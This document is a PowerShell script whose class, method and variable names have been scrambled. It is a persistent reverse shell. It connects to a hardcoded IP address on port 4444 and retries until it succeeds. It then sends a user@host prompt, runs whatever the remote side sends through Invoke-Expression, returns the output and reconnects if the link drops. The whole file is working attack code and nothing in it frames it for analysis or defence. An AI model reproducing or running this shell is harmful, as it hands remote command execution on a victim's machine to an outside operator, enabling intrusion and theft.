class djpluuVrkLNXoWgFQp {
    
    [string]$lhcprzLQpxwAWc = "93.49.240.195"
    [int]$WkiZgldOu = 4444

    $HlulizovEBLDIwQhupci
    $DOIPXXb
    $OkDGEKfdFiSKCmaKbl
    $EEBgJbwoQETmMTYTVkFXUGL
    $LKwPBDdnUnbTizQObY
    $yuLWbMOqGusCQ
    [int]$hmCJSwwGnQyBDpCxWeuk = 50*1024

    ugnzYyOvKXOJHShDGOjDaZ() {
        $this.DOIPXXb = $false
        while ($true) {
            try {
                $this.DOIPXXb = New-Object Net.Sockets.TcpClient($this.lhcprzLQpxwAWc, $this.WkiZgldOu)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.PZDLAowPTrMDrWbfCBsIj()
    }

    PZDLAowPTrMDrWbfCBsIj() {
        $this.HlulizovEBLDIwQhupci = $this.DOIPXXb.GetStream()
        $this.EEBgJbwoQETmMTYTVkFXUGL = New-Object Byte[] $this.hmCJSwwGnQyBDpCxWeuk
        $this.yuLWbMOqGusCQ = New-Object Text.UTF8Encoding
        $this.OkDGEKfdFiSKCmaKbl = New-Object IO.StreamWriter($this.HlulizovEBLDIwQhupci, [Text.Encoding]::UTF8, $this.hmCJSwwGnQyBDpCxWeuk)
        $this.LKwPBDdnUnbTizQObY = New-Object System.IO.StreamReader($this.HlulizovEBLDIwQhupci)
        $this.OkDGEKfdFiSKCmaKbl.AutoFlush = $true
    }

    rbWStafbAglPLyOueDTXWte() {
        $this.ugnzYyOvKXOJHShDGOjDaZ()
        $this.CvnENcLWedKtaq()
    }

    XbjQhyhWnFdaxPEGmFkpR($AGVURlUbFpBE) {
        try {
            [byte[]]$mGJpzVDwWEEPrdAJJqZHwFN = [text.Encoding]::Ascii.GetBytes($AGVURlUbFpBE)
            $this.OkDGEKfdFiSKCmaKbl.Write($mGJpzVDwWEEPrdAJJqZHwFN, 0, $mGJpzVDwWEEPrdAJJqZHwFN.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.rbWStafbAglPLyOueDTXWte()
        }
    }

    [string] hmffg() {
        try {
            $khnkm = $this.HlulizovEBLDIwQhupci.Read($this.EEBgJbwoQETmMTYTVkFXUGL, 0, $this.hmCJSwwGnQyBDpCxWeuk)    
            $VuMRJuZtu = ($this.yuLWbMOqGusCQ.GetString($this.EEBgJbwoQETmMTYTVkFXUGL, 0, $khnkm))
            return $VuMRJuZtu
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.rbWStafbAglPLyOueDTXWte()
            return ""
        }
    }

    [string] awMQSSPxqaZqlxgZbVooQrB($fUNBxCcSxcjrzA) {
        Write-Host $fUNBxCcSxcjrzA
        try { 
            $csIbHK = Invoke-Expression $fUNBxCcSxcjrzA | Out-String
        }
        catch {
            $rUhRFwXpeHxPkQlaoQ = $_.Exception
            $tDRufDu = $_.Message
            $csIbHK = "`n$_`n"
        }
        return $csIbHK
    }

    [string] xuSoDfVjtd() {
        $VaRlllVJtIAV = [Environment]::UserName
        $QgbTfWniPjaMOfLc = [System.Net.Dns]::GetHostName()
        $BXLQmvhMwJIWitA = Get-Location
        return "$VaRlllVJtIAV@$QgbTfWniPjaMOfLc [$BXLQmvhMwJIWitA]~$ "
    }

    CvnENcLWedKtaq() {
        while ($this.DOIPXXb.Connected) {
            $this.XbjQhyhWnFdaxPEGmFkpR($this.xuSoDfVjtd())         
            $VuMRJuZtu = $this.hmffg()
            $csIbHK = "`n"
            if ([string]::IsNullOrEmpty($VuMRJuZtu)) {
                continue
            }
            $csIbHK = $this.awMQSSPxqaZqlxgZbVooQrB($VuMRJuZtu)
            $this.XbjQhyhWnFdaxPEGmFkpR($csIbHK + "`n")
            $this.HlulizovEBLDIwQhupci.Flush()
        }
        $this.DOIPXXb.Close()
        $this.rbWStafbAglPLyOueDTXWte()
    } 
}

$HIJlXzmnDFWWykKXTb = [djpluuVrkLNXoWgFQp]::new()
$HIJlXzmnDFWWykKXTb.rbWStafbAglPLyOueDTXWte()
